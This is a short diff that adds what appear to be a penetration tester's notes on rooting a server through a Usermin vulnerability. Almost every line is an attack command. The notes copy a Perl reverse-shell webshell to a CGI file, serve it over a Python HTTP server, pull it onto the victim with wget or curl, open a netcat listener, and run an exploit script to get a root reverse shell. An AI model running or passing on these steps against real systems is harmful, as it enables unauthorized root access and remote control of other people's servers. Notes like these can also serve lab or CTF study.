@@ -1,0 +1,13 @@
+process runs as root- whatever we do will be with root privilege
+
+if usermin vulnerability is present -and we have access to the server- we have root
+
+cp /usr/share/webshells/perl/perl-reverse-shell.pl rshell.cgi
+python -m SimpleHTTPServer
+---
+wget | curl http://VICTIM:PORT/rshell.cgi -O rshell.cgi
+---
+nc -vlp PORT
+perl ./2017.pl VICTIM-IP PORT rshell.cgi 0
+
+As this is a pl server, cgi files will be executed.
